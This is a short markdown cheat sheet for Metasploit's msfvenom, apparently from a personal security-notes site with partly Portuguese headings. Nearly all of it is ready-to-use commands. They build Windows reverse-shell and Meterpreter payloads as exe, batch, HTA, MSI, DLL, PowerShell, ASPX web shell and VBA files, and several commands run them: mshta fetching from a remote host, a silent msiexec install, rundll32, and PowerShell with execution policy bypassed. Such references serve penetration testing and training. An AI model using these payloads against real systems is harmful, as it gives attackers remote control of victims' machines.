---
title: "Msfvenom Cheat Sheet"
permalink: /ct/msfvenom-cs/
layout: archive
author_profile: true
---

## Payload and its types

Listando formatos
```
msfvenom --list format
```

Listando plataformas
```
msfvenom --list platforms
```

Executable Payload (exe)
```
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe > shell.exe
```

Powershell Batch File
```
msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> > shell.bat
```

HTML Application Payload (HTA)
```
// Payload
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh > shell.hta

// Executando
mshta http://<IP>:<PORT>/shell.hta
```

Microsoft Installer Payload (MSI)
```
// Payload
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f msi > shell.msi

// Executando
msiexec /quiet /qn /i shell.msi
```

Dynamic-link library Payload (DLL)
```
// Payload
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f dll > shell.dll

// Executando
rundll32.exe shell.dll,0
```

Powershell Payload (psh-cmd)
```
msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f psh-cmd -f raw
```

Powershell Payload (ps1)
```
// Payload
msfvenom -p windows/x64/meterpreter_reverse_https lhost=<IP> lport=<PORT> -f psh > shell.ps1

// Executando
powershell -ep bypass
.\shell.ps1
```

Web shell Payload (ASPX)
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> -f aspx > shell.aspx
```

Visual Basic Payload (.vba)
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> -f vba
```

